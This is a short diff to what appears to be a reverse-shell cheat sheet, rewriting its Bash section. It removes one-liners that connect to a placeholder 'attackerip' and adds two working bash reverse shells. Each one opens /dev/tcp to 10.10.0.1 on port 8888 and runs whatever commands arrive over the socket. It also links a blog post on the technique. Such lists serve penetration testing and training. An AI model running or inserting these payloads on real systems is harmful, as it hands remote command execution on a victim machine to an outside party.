@@ -25,10 +25,13 @@ Or:
 ```
 Or:
 ```bash
-exec 5<>/dev/tcp/attackerip/4444
-cat <&5 | while read line; do $line 2>&5 >&5; done  # or:
-while read line 0<&5; do $line 2>&5 >&5; done
+exec 5<>/dev/tcp/10.10.0.1/8888;cat <&5 | while read line; do $line 2>&5 >&5; done
 ```
+or:
+```bash
+exec 5<>/dev/tcp/10.10.0.1/8888; while read line 0<&5; do $line 2>&5 >&5; done
+```
+
 See also [Reverse Shell With Bash](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) / http://www.gnucitizen.org/blog/reverse-shell-with-bash/ from GNUCITIZEN blog.
 
 ## Perl
